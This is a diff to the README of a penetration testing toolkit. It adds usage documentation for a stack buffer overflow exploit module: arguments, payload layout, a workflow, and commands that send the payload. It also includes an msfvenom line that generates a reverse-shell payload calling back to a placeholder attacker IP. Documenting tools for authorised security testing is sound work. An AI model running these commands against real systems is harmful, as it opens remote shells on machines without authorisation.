@@ -20,6 +20,9 @@ A modular black box penetration testing toolkit for identifying and validating c
 - **BOLA/IDOR** — Path-based and parameter-based object-level authorization testing
 - **JWT Weakness Detection** — Tests for alg:none, weak secrets, and algorithm confusion attacks
 
+**Exploit Development**
+- **Buffer Overflow** — Parameterized stack-based buffer overflow exploit with NOP sled, bad char detection, and dry run mode
+
 ---
 
 ## Installation
@@ -242,6 +245,72 @@ python3 jwt.py <TOKEN> [--url URL] [--header HEADER] [--alg-none] [--weak-secret
 
 ---
 
+## Exploit Development
+
+### Buffer Overflow (`Buffer-Overflow/buffer_overflow.py`)
+
+Parameterized stack-based buffer overflow exploit module. Builds and delivers a payload with configurable NOP sled, bad char detection, and dry run mode. Supports raw shellcode binaries generated with NASM or msfvenom.
+
+```bash
+python3 buffer_overflow.py -H <HOST> -p <PORT> -s <SHELLCODE> -b <BUFFER_SIZE> -r <RET_ADDR> [OPTIONS]
+```
+
+| Argument | Description |
+|---|---|
+| `-H`, `--host` | Target IP or hostname |
+| `-p`, `--port` | Target port |
+| `-s`, `--shellcode` | Path to raw shellcode binary (default: `shellcode.bin`) |
+| `-b`, `--buffer-size` | Vulnerable buffer size in bytes |
+| `-r`, `--ret-addr` | Return address in hex (e.g. `0x7fffffffdb90`) |
+| `--nop-size` | NOP sled size in bytes (default: 128) |
+| `--rbp-size` | Saved RBP size (default: 8) |
+| `--extra-offset` | Extra padding adjustment for fine-tuning (default: 0) |
+| `--bad-chars` | Comma-separated bad chars to check (default: `00,0a,0d`) |
+| `--send` | Actually send the payload — omit for dry run |
+| `--timeout` | Socket timeout in seconds (default: 5) |
+
+**Payload layout:**
+```
+[ padding ] [ saved RBP ] [ RIP ] [ NOP sled ] [ shellcode ]
+```
+
+**Workflow:**
+1. Find the buffer size and return address using GDB/GEF
+2. Generate shellcode with NASM or msfvenom
+3. Dry run first to verify layout and check for bad chars
+4. Send the payload with `--send`
+
+```bash
+# Dry run to verify layout
+python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
+  -s revshell.bin -b 64 -r 0x7fffffffdb90
+
+# Fire when ready
+python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
+  -s revshell.bin -b 64 -r 0x7fffffffdb90 --send
+
+# Custom NOP sled and bad chars
+python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
+  -s revshell.bin -b 64 -r 0x7fffffffdb90 \
+  --nop-size 256 --bad-chars "00,0a,0d,20" --send
+```
+
+**Generating shellcode:**
+```bash
+# Reverse shell with msfvenom (bad char filtering built in)
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=<YOUR_IP> LPORT=9001 \
+  -b '\x00\x0a\x0d' \
+  -f raw -o revshell.bin
+
+# Custom NASM shellcode
+nasm -f elf64 shellcode.asm -o shellcode.o
+ld -o shellcode shellcode.o
+objcopy -O binary --only-section=.text shellcode shellcode.bin
+```
+
+---
+
 ## Examples
 
 ```bash
@@ -271,6 +340,12 @@ python3 bola.py http://target.com/api/users --token eyJ... --range 10
 
 # JWT all tests
 python3 jwt.py eyJ... --url http://target.com/api/profile --all
+
+# Buffer overflow dry run
+python3 buffer_overflow.py -H 192.168.1.10 -p 4444 -s revshell.bin -b 64 -r 0x7fffffffdb90
+
+# Buffer overflow fire
+python3 buffer_overflow.py -H 192.168.1.10 -p 4444 -s revshell.bin -b 64 -r 0x7fffffffdb90 --send
 ```
 
 ---
